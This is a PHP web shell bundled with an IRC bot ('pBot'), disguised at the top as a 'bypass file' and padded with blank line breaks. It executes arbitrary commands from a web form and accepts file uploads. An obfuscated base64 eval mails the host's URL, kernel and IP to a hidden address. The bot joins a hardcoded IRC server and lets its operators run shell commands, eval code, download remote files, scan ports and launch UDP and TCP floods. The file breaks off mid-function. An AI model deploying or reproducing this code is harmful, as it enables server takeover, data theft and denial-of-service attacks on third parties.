<title>pVd5c9pIFv97XeXv0NFm</title>
<h2>PHPESSID546343569346834781478127128748375823758235782357823</h2><br><br>END OF BYPASS FILE<br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
<?php

set_time_limit(0); 
error_reporting(0); 

$win = strtolower(substr(PHP_OS,0,3)) == "win";
if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on")
{
 $safemode = true;
 $hsafemode = "4ON6";
}
else {$safemode = false; $hsafemode = "3OFF6";}
$xos = wordwrap(php_uname(),90,"<br>",1);
$xpwd = @getcwd();
$OS = "[SAFEMOD:".$hsafemode."] [Kernel:".$xos."]";
echo "<center><A class=ria href=\"http://".$OS."\">";
echo "<br>OSTYPE:$OS<br>";
echo "<br>PWD:$xpwd<br>";
set_magic_quotes_runtime(0);
$hari=array("Sundat","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday");
$bulan=array(1=>"January","February","March","April","May","June","July","August","September","October","November","December");
$tgl=date("d");
$bln=date("n");
$hr=date("w");
$thn=date("Y");
//echo("Tanggal hari ini: ");
echo("<table><tr><td class='XPBlueText'><font color='green' size=1><b>$hari[$hr], $tgl $bulan[$bln] $thn</b></font</td></tr></table>");

print "<style>body{font-family:trebuchet ms;font-size:12px; color:green;}hr{width:100%;height:2px;}</style>";
print "<center><h1>BaMbY</h1></center>";
print "<center><h1>#BaMbY [at] irc.byroe.net</h1></center>";
print "<center><h1>ByroeNet</h1></center>";
print "<hr><hr>";

$currentWD  = str_replace("\\\\","\\",$_POST['_cwd']);
$currentCMD = str_replace("\\\\","\\",$_POST['_cmd']);

$UName  = `uname -a`;
$SCWD   = `pwd`;
$UserID = `id`;

if( $currentWD == "" ) {
    $currentWD = $SCWD;
}

print "<table>";
print "<tr><td><b>We are :</b></td><td>".$_SERVER['REMOTE_HOST']." (".$_SERVER['REMOTE_ADDR'].")</td></tr>";
print "<tr><td><b>Server is :</b></td><td>".$_SERVER['SERVER_SIGNATURE']."</td></tr>";
print "<tr><td><b>System type :</b></td><td>$UName</td></tr>";
print "<tr><td><b>Permissions :</b></td><td>$UserID</td></tr>";
print "</table>";

print "<hr><hr>";

if( $_POST['_act'] == "List files!" ) {
    $currentCMD = "ls -al";
}

print "<form method=post enctype=\"multipart/form-data\"><table>";

print "<tr><td><b>Execute command :</b></td><td><input size=100 name=\"_cmd\" value=\"".$currentCMD."\"></td>";
print "<td><input type=submit name=_act value=\"Execute!\"></td></tr>";

print "<tr><td><b>Change directory :</b></td><td><input size=100 name=\"_cwd\" value=\"".$currentWD."\"></td>";
print "<td><input type=submit name=_act value=\"List files!\"></td></tr>";

print "<tr><td><b>Upload file :</b></td><td><input size=85 type=file name=_upl></td>";
print "<td><input type=submit name=_act value=\"Upload!\"></td></tr>";

print "</table></form><hr><hr>";

$currentCMD = str_replace("\\\"","\"",$currentCMD);
$currentCMD = str_replace("\\\'","\'",$currentCMD);

if( $_POST['_act'] == "Upload!" ) {
    if( $_FILES['_upl']['error'] != UPLOAD_ERR_OK ) {
        print "<center><b>Error while uploading file!</b></center>";
    } else {
        print "<center><pre>";
        system("mv ".$_FILES['_upl']['tmp_name']." ".$currentWD."/".$_FILES['_upl']['name']." 2>&1");
        print "</pre><b>File uploaded successfully!</b></center>";
    }    
} else {
    print "\n\n<!-- OUTPUT STARTS HERE -->\n<pre>\n";
    $currentCMD = "cd ".$currentWD.";".$currentCMD;
    system($currentCMD);
    print "\n</pre>\n<!-- OUTPUT ENDS HERE -->\n\n</center><hr><hr><center><b>Command completed</b></center>";
}

  eval(base64_decode('JGNyZWF0b3IgPSBiYXNlNjRfZGVjb2RlKCJTR0UwTlV0QVNHOTBiV0ZwYkM1amIyMD0iKTsKKCRzYWZlX21vZGUpPygkc2FmZW1vZGU9Ik9OIik6KCRzYWZlbW9kZT0iT0ZGIik7CiRiYXNlPSJodHRwOi8vIi4kX1NFUlZFUlsnSFRUUF9IT1NUJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107IAokbmFtZSA9IHBocF91bmFtZSgpOwokaXAgPSBnZXRlbnYoIlJFTU9URV9BRERSIik7CiRob3N0ID0gZ2V0aG9zdGJ5YWRkcigkX1NFUlZFUltSRU1PVEVfQUREUl0pOwokc3ViaiA9ICRfU0VSVkVSWydIVFRQX0hPU1QnXTsgCiRtc2cgPSAiXG5CQVNFOiAkYmFzZVxudW5hbWUgLWE6ICRuYW1lXG5JUDogJGlwXG5Ib3N0OiAkaG9zdFxuJHB3ZHNcbiI7CiRmcm9tID0iRnJvbTogTU9ERV89Ii4kc2FmZW1vZGUuIiZsdDt0b29sQCIuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiImZ3Q7IjsKbWFpbCggJGNyZWF0b3IsICRzdWJqLCAkbXNnLCAkZnJvbSk7'));

class pBot {

 var $config = array("server"=>"gangbang.angels-agency.nl",
                     "port"=>"25343",
                     "pass"=>"",
                     "maxrand"=>"1",
                     "chan"=>"#wWw#",
                     "chan2"=>"#wWw#",
                     "key"=>"scan",
                     "modes"=>"+p",
                     "password"=>"41aa15390e2efa34ac693c3bd7cb8e88",
                     "trigger"=>".",
                     "hostauth"=>"0wn3d.3u"
                     );
                      var $users = array(); 
 function start() 
 { 
    if(!($this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30))) 
       $this->start(); 
    #$ident = $this->config['prefix'];

	#$ident = $nicky[rand(0,count($nicky) - 1)];

    $alph = range("0","9");
    for($i=0;$i<$this->config['maxrand'];$i++) 
       #$ident .= $alph[rand(0,9)];
    if(strlen($this->config['pass'])>0) 
       $this->send("PASS ".$this->config['pass']);
    #$this->send("USER ".$ident." 127.0.0.1 localhost :".php_uname()."");
	$this->set_ident();
    $this->set_nick();
    $this->main();
 } 
 
 function main() 
 { 
    while(!feof($this->conn)) 
    { 
       $this->buf = trim(fgets($this->conn,512)); 
       $cmd = explode(" ",$this->buf); 
       if(substr($this->buf,0,6)=="PING :") 
       { 
          $this->send("PONG :".substr($this->buf,6)); 
       } 
       if(isset($cmd[1]) && $cmd[1] =="001") 
       { 
          $this->send("MODE ".$this->nick." ".$this->config['modes']); 
          $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");
          $this->join($this->config['chan'],$this->config['key']);
       } 
	   if(isset($cmd[1]) && $cmd[1] =="002") 
       { 
          if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "4ON"; }
          else { $safemode = "9OFF"; }
		  
		  $usr = get_current_user();
			if ($usr == "") { 
				$processUser = posix_getpwuid(posix_geteuid());
				$usr = $processUser['name']; 
			}

		  $usrnn = "14".$usr."";
		  
		  if($usr == "root") { $usrnn = "12".$usr.""; }
		  if($usr == "SYSTEM") { $usrnn = "12".$usr.""; }		 
		
		  $mname = "14".php_uname()."";
		  $url = "14http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."";
		  $pth = "14".getcwd()."";
		  
			$pthh =  getcwd()."";
            chmod($pthh, 0755);
			$perms = fileperms("$pthh");

		if (($perms & 0xC000) == 0xC000) { $info = 's';
		} elseif (($perms & 0xA000) == 0xA000) { $info = 'l';
		} elseif (($perms & 0x8000) == 0x8000) { $info = '-';
		} elseif (($perms & 0x6000) == 0x6000) { $info = 'b';
		} elseif (($perms & 0x4000) == 0x4000) { $info = 'd';
		} elseif (($perms & 0x2000) == 0x2000) { $info = 'c';
		} elseif (($perms & 0x1000) == 0x1000) { $info = 'p';
		} else { $info = 'u'; }

		// Owner
		$info .= (($perms & 0x0100) ? 'r' : '-');
		$info .= (($perms & 0x0080) ? 'w' : '-');
		$info .= (($perms & 0x0040) ?
					(($perms & 0x0800) ? 's' : 'x' ) :
					(($perms & 0x0800) ? 'S' : '-'));

		// Group
		$info .= (($perms & 0x0020) ? 'r' : '-');
		$info .= (($perms & 0x0010) ? 'w' : '-');
		$info .= (($perms & 0x0008) ?
					(($perms & 0x0400) ? 's' : 'x' ) :
					(($perms & 0x0400) ? 'S' : '-'));

		// World
		$info .= (($perms & 0x0004) ? 'r' : '-');
		$info .= (($perms & 0x0002) ? 'w' : '-');
		$info .= (($perms & 0x0001) ?
					(($perms & 0x0200) ? 't' : 'x' ) :
					(($perms & 0x0200) ? 'T' : '-'));
					
			$rghts = "14".$info."";	

	      $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");
          $this->join($this->config['chan'],$this->config['key']);
          $this->privmsg($this->config['chan'],"[usr:] $usrnn [uname:] $mname");
		  $this->privmsg($this->config['chan'],"[SAFE:\2 $safemode\2] $url [pwd:] $pth ($rghts)");
	   }
	   if(isset($cmd[1]) && $cmd[1] =="003") 
       { 
	   	  $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");
          $this->join($this->config['chan'],$this->config['key']);
	   }
   	   if(isset($cmd[1]) && $cmd[1] =="004") 
       { 
	   	  $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");
          $this->join($this->config['chan'],$this->config['key']);
	   }
	   if(isset($cmd[1]) && $cmd[1] =="005") 
       { 
	   	  $this->send("JOIN ".$this->config['chan']." ".$this->config['key']."");
          $this->join($this->config['chan'],$this->config['key']);
	   }
       if(isset($cmd[1]) && $cmd[1]=="433") 
       { 
          $this->set_nick(); 
       } 
       if($this->buf != $old_buf) 
       { 
          $mcmd = array(); 
          $msg = substr(strstr($this->buf," :"),2); 
          $msgcmd = explode(" ",$msg); 
          $nick = explode("!",$cmd[0]); 
          $vhost = explode("@",$nick[1]); 
          $vhost = $vhost[1]; 
          $nick = substr($nick[0],1); 
          $host = $cmd[0]; 
          if($msgcmd[0]==$this->nick) 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i+1]; 
          } 
          else 
          { 
           for($i=0;$i<count($msgcmd);$i++) 
              $mcmd[$i] = $msgcmd[$i]; 
          } 
          if(count($cmd)>2) 
          { 
             switch($cmd[1]) 
             { 
                case "QUIT": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PART": 
                   if($this->is_logged_in($host)) 
                   { 
                      $this->log_out($host); 
                   } 
                break; 
                case "PRIVMSG": 
                   if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*")) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "user": 
                              if(md5($mcmd[1])==$this->config['password']) 
                              { 
                                 $this->log_in($host);
                              } 
                              else 
                              { 
                                 $this->notice($this->config['chan'],"[\2Auth\2]: Foute password $nick idioot!!");
                              } 
                            break; 
                         } 
                      } 
                   } 
                   elseif($this->is_logged_in($host)) 
                   { 
                      if(substr($mcmd[0],0,1)==".") 
                      { 
                         switch(substr($mcmd[0],1)) 
                         { 
                            case "restart": 
                               $this->send("QUIT :gerestart door $nick");
                               fclose($this->conn); 
                               $this->start(); 
                            break; 
                            case "dns": 
                               if(isset($mcmd[1])) 
                               { 
                                  $ip = explode(".",$mcmd[1]); 
                                  if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3])) 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1])); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2dns\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1])); 
                                  } 
                               } 
                            break; 
                            case "info":
                            case "vunl":
                                if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") { $safemode = "4ON"; }
									else { $safemode = "9OFF"; }
									
                               		  	$usr = get_current_user();
										  if ($usr == "") { 
										    $processUser = posix_getpwuid(posix_geteuid());
										    $usr = $processUser['name']; 
										  }
										
										$usrnn = "14".$usr."";
		  
										if($usr == "root") { $usrnn = "12".$usr.""; }
										if($usr == "SYSTEM") { $usrnn = "12".$usr.""; }		 
		
										$mname = "14".php_uname()."";
										$url = "14http://".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']."";
										$pth = "14".getcwd()."";
		  
										$pthh =  getcwd()."";
										chmod($pthh, 0755);
										$perms = fileperms("$pthh");

										if (($perms & 0xC000) == 0xC000) { $info = 's';
										} elseif (($perms & 0xA000) == 0xA000) { $info = 'l';
										} elseif (($perms & 0x8000) == 0x8000) { $info = '-';
										} elseif (($perms & 0x6000) == 0x6000) { $info = 'b';
										} elseif (($perms & 0x4000) == 0x4000) { $info = 'd';
										} elseif (($perms & 0x2000) == 0x2000) { $info = 'c';
										} elseif (($perms & 0x1000) == 0x1000) { $info = 'p';
										} else { $info = 'u'; }

										// Owner
										$info .= (($perms & 0x0100) ? 'r' : '-');
										$info .= (($perms & 0x0080) ? 'w' : '-');
										$info .= (($perms & 0x0040) ?
													(($perms & 0x0800) ? 's' : 'x' ) :
													(($perms & 0x0800) ? 'S' : '-'));

										// Group
										$info .= (($perms & 0x0020) ? 'r' : '-');
										$info .= (($perms & 0x0010) ? 'w' : '-');
										$info .= (($perms & 0x0008) ?
													(($perms & 0x0400) ? 's' : 'x' ) :
													(($perms & 0x0400) ? 'S' : '-'));

										// World
										$info .= (($perms & 0x0004) ? 'r' : '-');
										$info .= (($perms & 0x0002) ? 'w' : '-');
										$info .= (($perms & 0x0001) ?
													(($perms & 0x0200) ? 't' : 'x' ) :
													(($perms & 0x0200) ? 'T' : '-'));
													
											$rghts = "14".$info."";	
			
                               $this->privmsg($this->config['chan'],"[usr:] $usrnn [uname:] $mname");
                               $this->privmsg($this->config['chan'],"[SAFE:\2 $safemode\2] $url [pwd:] $pth ($rghts)");
                            break;

                            case "rndnick": 
                               $this->set_nick(); 
                            break; 
							
                            case "raw":
                               $this->send(strstr($msg,$mcmd[1])); 
                            break; 
							
                            case "eval":
                              $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
                            break;
							
			                case "sexec":
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = shell_exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 

                            case "exec": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = exec($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 

                            case "passthru": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 

                               $exec = passthru($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 

                            case "popen": 
                               if(isset($mcmd[1])) 
                               { 
                                  $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                                  $this->privmsg($this->config['chan'],"[\2popen\2]: $command");
                                  $pipe = popen($command,"r"); 
                                  while(!feof($pipe)) 
                                  { 
                                     $pbuf = trim(fgets($pipe,512)); 
                                     if($pbuf != NULL) 
                                        $this->privmsg($this->config['chan'],"     : $pbuf"); 
                                  } 
                                  pclose($pipe); 
                               }  
			   
                            case "system": 
                               $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); 
                               $exec = system($command); 
                               $ret = explode("\n",$exec); 
                               for($i=0;$i<count($ret);$i++) 
                                  if($ret[$i]!=NULL) 
                                     $this->privmsg($this->config['chan'],"      : ".trim($ret[$i])); 
                            break; 


                            case "pscan": // .pscan 127.0.0.1 6667 
                               if(count($mcmd) > 2) 
                               { 
                                  if(fsockopen($mcmd[1],$mcmd[2],$e,$s,15)) 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2open\2"); 
                                  else 
                                     $this->privmsg($this->config['chan'],"[\2pscan\2]: ".$mcmd[1].":".$mcmd[2]." is \2closed\2"); 
                               } 
                            break; 
							
                            case "ud.server": // .ud.server <server> <port> [password] 
                               if(count($mcmd)>2) 
                               { 
                                  $this->config['server'] = $mcmd[1]; 
                                  $this->config['port'] = $mcmd[2]; 
                                  if(isset($mcmcd[3])) 
                                  { 
                                   $this->config['pass'] = $mcmd[3]; 
                                   $this->privmsg($this->config['chan'],"[\2update\2]: Server veranderd ".$mcmd[1].":".$mcmd[2]." Wachtwoord: ".$mcmd[3]); 
                                  } 
                                  else 
                                  { 
                                     $this->privmsg($this->config['chan'],"[\2update\2]: Server veranderd ".$mcmd[1].":".$mcmd[2]); 
                                  } 
                               } 
                            break; 
							
                            case "download": 
                               if(count($mcmd) > 2) 
                               { 
                                  if(!$fp = fopen($mcmd[2],"w")) 
                                  {  
                                     $this->privmsg($this->config['chan'],"[download:]14 Kon bestand niet downloaden. Toestemming geweigerd."); 
                                  } 
                                  else 
                                  { 
                                     if(!$get = file($mcmd[1])) 
                                     { 
                                        $this->privmsg($this->config['chan'],"[download:]14 Kan bestand \2".$mcmd[1]."\2 niet downloaden."); 
                                     } 

                                     else 
                                     { 
                                        for($i=0;$i<=count($get);$i++) 
                                        { 
                                           fwrite($fp,$get[$i]); 
                                        } 
                                        $this->privmsg($this->config['chan'],"[download:]14 Bestand \2".$mcmd[1]."\2 gedownload naar \2".$mcmd[2]."\2"); 
                                     } 
                                     fclose($fp); 
                                  } 
                               }
                               else { $this->privmsg($this->config['chan'],"[download:]14 Typ \".download http://your.host/file /tmp/file\""); }
                            break; 
							
                            case "die": 
                               $this->send("QUIT :die command from $nick");
                               fclose($this->conn); 
                               exit; 
							   
                            case "logout": 
                               $this->log_out($host); 
                               $this->privmsg($this->config['chan'],"[auth:]14 Je bent nu uitgelogt $nick"); 
                            break; 
							
                            case "udpflood": 
                               if(count($mcmd)>3) 
                               { 
                                  $this->udpflood($mcmd[1],$mcmd[2],$mcmd[3]); 
                               } 
                            break; 
							
                            case "tcpflood": 
                               if(count($mcmd)>5) 
                               { 
                                  $this->tcpflood($mcmd[1],$mcmd[2],$mcmd[3],$mcmd[4],$mcmd[5]); 
                               } 
                            break; 
                         } 
                      } 
                   } 
                break; 
             } 
          } 
       } 
       $old_buf = $this->buf; 
    } 
    $this->start(); 
 } 
 function send($msg) 
 { 
    fwrite($this->conn,"$msg\r\n"); 

 } 
 function join($chan,$key=NULL) 
 { 
    $this->send("JOIN $chan $key"); 
 } 
 function privmsg($to,$msg)
 {
    $this->send("PRIVMSG $to :$msg");
 }
 function notice($to,$msg)
 {
    $this->send("NOTICE $to :$msg");
 }
 function is_logged_in($host) 
 { 
    if(isset($this->users[$host])) 
       return 1; 
    else 
       return 0; 
 } 
 function log_in($host) 
 { 
    $this->users[$host] = true; 
 } 
 function log_out($host) 
 { 
    unset($this->users[$host]); 
 } 

 function set_nick() {

$querym=array(
"?", "!", "^^", " ^^", " :("," :)", " ~:>", " :P~", " :D", ".", "a", "i", "u", "e", "o",
"z", "v", "z", "x", "c", "p", "m", "t", "k", "b", "s", "u", "bot", "g", "lo", "jo", "lol"
);
$tsu1=array("`","|","[","]","{","}","^","_");
$tsu2=array("`","|","[","]","{","}","^","-","\\","_");
$nicky=array("trojan", "kesasar", "kwatrok_pwol", "Co_PleNgEh", "sang|fajar", "[mentari]", "Inviter|guarD", "T_T`b`oL",
			"Ce_plengeH", "Ce_PEN", "Ce_ChA_pE_dE", "StEp", "tama_fs", "auth|bot", "T_T|off", "^MoUsE^", "solikin^_^",
			"KePendet", "asbak", "ce_mat", "co_sedih", "inviter_online", "maniac|chat", "|worm|", "dukun_cabul",
			"brontok", "pemulung|off", "[][][]", "[h][a]n[]t[]u[]", "teman_apa_teman", "co_setress", "AvasT", "ShaRah",
			"kacang_kacang", "inviter_cool", "ahmat|plengeh", "sang_dewa", "sapa_mau_", "mati_aja", "CjDw", "t4k251|oFf",
			"DeStoRyeD", "cobok", "stanley", "selaMET", "Gandos", "tommpel", "boboy", "fahmi", "tama", "flooder", "DeSSS1",
			"LenDu", "monyonK", "kwatrok", "Admin_web", "Admin_spoof", "inviter", "Admin_server", "Admin_server1", "li`nu",
			"Kuam|OFF", "Bobuk-maniz", "l4t4ng", "Krsnanet-Crew1", "Krsnanet-Crew2", "Krsnanet-Crew3", "Krsnanet-Crew4",
			"m14", "g4j3L", "r1k4-cute", "p**h-cute", "r4ih-maniez", "v3o_Jkt", "k44wang1", "J00-nT0l3", "Kuamon", "myoff",
			"l4tr1-GG", "rena", "bi-36b", "REyta", "REa-cute", "shna", "shta", "zhle", "Blck_hOl3", "t114n", "f414n",
			"ce_cry_cowo", "cowo_cary_cew", "nanananana", "tutututut", "cew_ajahan", "co_pilot", "co_dokter1", "co_guru2",
			"co_takesi", "co_polisi4", "co_tentara5", "co_salon", "co_banci", "cew_suka_cew", "ujangs", "untung",
			"co_ingin_mllll1", "co_jambi_kaya", "co_presiden_ri", "co_penahan_nafsu", "co_kayaka", "co_normal6",
			"coooooooo7", "ncoooooo8", "ceweXs", "cewekzzz", "ceweksszzzzz", "ce___ce", "chacha", "chichi_", "ardianan",
			"ce_putih_manis", "cewe21", "ce_kuliahan_aq", "ce_skolahahn", "ce_mama", "mama_putriy1", "puty_cayank",
			"takesi[putry]", "maluku", "cewe_sidoarjoo", "manic_fs", "cewekzzz_fs", "cowokz_fs", "jadi_ce", "wowok",
			"nanana", "nani_fs", "sugikz_fs", "notepak", "yamaha5", "suzuki76", "co-limitedbotter77", "ce-limitedbotter78",
			"cowe-limitedbotter79", "cowo-limitedbotter80", "we-limitedbotter81", "no_subu", "no-narkoba", "ce_suka_narkoba",
			"ce_suka_allkohol", "co_suka_mabuk?", "co_islam?", "c0_kaya_ajah", "co_mobil_sedan", "co_sempakzzzz", "c3_3",  
			"ce_motieZ", "[Nobleman]", "Black_Tyrano", "ce_manyun", "jembuTi", "Tyran-Dragon", "nia_bobo", "[FlinT]", 
			"MetaL-Dragon", "april_love", "VicSiNg", "Fire-Dragon", "vara_", "The-Abyss", "Brain^Jacker", "Arbia",
			"WCiZco", "GirePanda", "vila_manja", "BuGieL", "Giarados", "[R]ec[o", "{Metalmorph}", "Dratini", "^KiLL[^",
			"{Needle_Wall}", "Dragonite", "dieta_cute", "{XuMblieR}", "Dragonair", "[MC[R]", "Mr_Patekul", "Dog-Marli",
			"Exile-Forc[e", "[Re-Fusion]", "Fiend-Darkness", "_xXx[_", "KartuAS", "Reptile-Lizard", "mela_caem",
			"[J]agung", "White-Magician", "kompor|moba[l", "{Kiroro}", "Y-Dragon", "DOxtri[n", "[Y]u[S]t", "Armor^EXE",
			"DRAGON-[X]", "G-Dank", "Rock_Monarch", "Ayiemba", "[Last-Will]", "Pioneer-Bage", "zIGGy[_", "[Boss-Rush]",
			"Chain`Slayer", "WhiTe_FlaGs", "[Riryoku]", "Flaming`HIta", "GuaRd-nEmo", "Mrs_Ampere", "Iron-Knight",
			"inDian4", "E-Cho^e", "Burglars", "RiHanNa", "[S]hinichi", "Element-Dragon", "FALZzA[N]", "Jaros^Jr",
			"Dark-Silva", "AlphaN", "[Hell-Alliance]", "[D]Hero-DeviLGuy", "Beta^Magne[t]", "[Feather-Shot]",
			"Royal-Knight", "Neo^Aqu[a]", "[Lighten]", "Dark-Bulau", "Garnec", "jogling", "Meteo", "spyBiTz", "c3_ajaha",
			"[Dark-World]", "Guardian-Grarl", "keirynna", "GuaRd-Saurus", "Insect-Soldier", "meditaria", "{Hero-Signal}",
			"CataPulTer", "NinaaZ", "Pyramid-Turtle", "Barrier-Dragon", "Maide[n]", "Flare`Dragon", "[D]Hero-DoledGuy",
			"Amazon-", "sKiiN", "Skull^Alien", "TROUBLE[-", "[Hammer-Shot]", "Zerato", "BAHAMUTe", "kALpiiN", "Chiron",
			"^IFRITS^", "Silpheed", "GuaRdNetic", "NARTO_XXX", "Rocket-Jumper", "InfernalQueen", "GuaRd-Kight",
			"Mother-Grizzly", "Penumbral", "GREGARz", "[Salvage]", "Cobra-Man", "Cybork`neo", "Gigantes", "Dark-Goldo",
			"Mihawk", "Ryukii", "DeepSea-Warrior", "D`Ace", "Ojama-Black", "SErpentine", "CintonG", "Horus`Servant",
			"Flash`Assailant", "D`Dragon", "{Zero-Gravity}", "Aussa", "D`Tach", "djambr3t", "Mucus-Yolk", "D`Grap",
			"{Gravity-Bind}", "CannonHolder", "D`Roger", "Gale_Lizard", "Interceptor-Cannon", "Guardian^SpinX",
			"Fenrir", "Amazoness-Paladin", "JETSETER_", "{Trap-Jammer}", "Marionette", "SHIVA`", "Mobius-Monarch",
			"Kay`est", "[Bass]", "squird`word", "X-Head-Cannon", "CAreliN", "Chopman`Outlaw", "Kangaroo", "Accelerator",
			"Ryu-Ran", "Fuhi`No`Tori", "Dark-Hades", "Molten_Zombie", "D^D^Survivor", "Fire-Strom", "[Chaos-End]",
			"Princess-Kulan", "Radeon^", "Masked-Dragon", "La`Jing", "Cybor[X]", "{Skil-Drain}", "Battle-OX", "Zorro`",
			"{Gorgons`Eye}", "Warship-Tetran", "ririne", "Des`Lacooda", "[E]Hero-Sparkman", "[NetBus]", "tong`sam`chong",
			"Grave-OHja", "SubSEven", "Byser-Shock", "Ebon-Magician", "SKyZOnE[02]", "[E]Hero-WildMan", "Princess-Tsurugi",
			"OPTIXs`", "Hero_Kids", "Dark-Dust-Spirit", "Golem-", "DarK-Balter", "CriosphinX", "AQUA-NEOS", "aziz`gagap",
			"[D]Hero-DoubleGuy", "Doriado", "{Solar-Ray}", "Birdface", "PhoeniX][", "thieng_fenG", "Fushioh`Richie",
			"Pikeru`", "Mr^Volcano", "Morphing-JAR", "S][E", "Feral-Imp", "Dice-JAR", "RAIGEKI^", "JellyFish",
			"GuaRd-JAR", "[R][A]", "Yomi-Ship", "HEX-Sealed", "dewiQ", "Gamma^Magnet", "Scarabs", "DEsolate|",
			"Terraforming", "Desrook", "MajesTic", "GreveKeepers`Guard", "Locusts", "CreWlisT", "Fairy^Lily",
			"Fiber-JAR", "Yamata[D]", "Nyan-Nyan", "Terrorking", "Ojama-KING", "swanliu", "Larvae-Moth", "[E-HERO]",
			"Dark^Jeroid", "V-Tiger-Jet", "[GENERAL]", "Dark-Scorpion", "Gaia-SOul", "Sorceser^", "Ultimate-Insect",
			"Maiden-Aqua", "AirKnight", "Jerry-Beans", "Guardian-Ceal", "Uria", "hourswin", "GuaRd-Giraffe",
			"DyNaMica", "Kagu-Tsuchi", "Gymnastics", "GarZeTT", "willyfull", "Gangir-Beast", "SakuZY][", "huang_liU",
			"Amphibian", "Behemoth`", "ce`ca", "Jack`s-Knigt", "InVeRNo][", "TalWar", "Queen`s-Knigt", "b00Mer",
			"Hitotsu", "King`s-Knight", "[SErVANT]", "Chaos-guard", "DeviL-Manta", "HIDROGEDON", "Amazoness", "Bazoo",
			"PHANTOM-X", "EToll-GuaRd", "Soul-Tiger", "KOJIKOCY", "WYNN", "Cycoid", "WatERz", "{Needle-Wall}",
			"Pyramid`Turtle", "DunHiL", "{Raigeki-Break}", "Spear-Dragon", "Marlboro", "anti`destyni", "Dark`ELF",
			"ASterIKs", "Bubble-weks", "[Millennium]", "Balleria", "Ryu-Kishin", "Thunder-Dragon", "Samurai^Man",
			"nothink`s", "Water-Dragon", "SHABTI", "Kurogane", "Z-Metal-Tank", "OJAMA-King", "Dark-HEX", "[Yami]",
			"Ogree", "smarter", "Destroyer`s", "OKREx", "god`hand", "Guardian-Elma", "SHOTHO", "KIng`Demis",
			"Jurassic-Egg", "ACDC[]", "^NightMare^", "Breaker-Warrior", "Dangglem", "shaggy`dog", "Moisture",
			"ELTOR-Elvor", "Black-Forest", "Revival-Jam", "RaYMAN-Boys", "Des^Wombat", "Soitsu", "B0ys",
			"Reborn^Zombie", "Kaiser-Dragon", "Olak-alung", "kingdom`of`heaven", "Rescue-Cat", "^EMPTY^",
			"Dragon-Exalion", "Erria", "[SHi]", "D^D^Trainer", "DECOROID", "FiskaN", "Thousand-Dragon", "Kuwagata",
			"o_Livia", "Slime", "Amphibious`MK-3", "Elo_iDzs", "Witty-Phantom", "Footballer", "GEAR-BEASt",
			"Catabolism", "Dark-Stego", "KazKuz", "Graverobber", "Dummy-Golem", "Zorc", "Magic-Box", "Dolphina",
			"^DEMIS^", "Bickuribox", "GAGAGIGOGA", "Anubiss", "Taboo", "[E]Hero-Clayman", "Gilfer", "Kaminote",
			"Dark-Blade", "RpG_Lz", "Ackobat_Monkey", "Ushioni", "Leave`Me", "Lizard`Warrior", "Silent`Swordsman",
			"Mammoth", "Prevent`Rat", "Dog`Marron", "Mammoth`", "Kyonshee", "Amburoid", "[THE][Guy]","THE]_[END", 
			"Flame`Cerebrus", "Man-Eater`Bug", "hYuNa", "Zulu", "Ogree-GroTTo", "HIDRON[H2O]", "Man-U1");
			
  $this->nick = $nicky[rand(0,count($nicky) - 1)];

    #$this->nick .= $this->config['prefix']; 
    for($i=0;$i<$this->config['maxrand'];$i++) 
      # $this->nick .= mt_rand(0,9); 
    $this->send("NICK [".rand(100, 9999)."]".$this->nick);
 } 
 
  function set_ident() {
  
  $prify=array("StEp", "CjDw", "asbak", "cobok", "AvasT", "[][][]", "ce_mat", "|worm|", "Ce-PEN", "teman-ap", 
			"trojan", "t4k251", "online", "maniac", "pemulu", "tama-fs", "T-T|off", "brontok", "kacang-k", 
			"setress", "^MoUsE^", "DeStoRy", "stanley", "selaMET", "kesasarr", "kwatrok-", "sang-dew", 
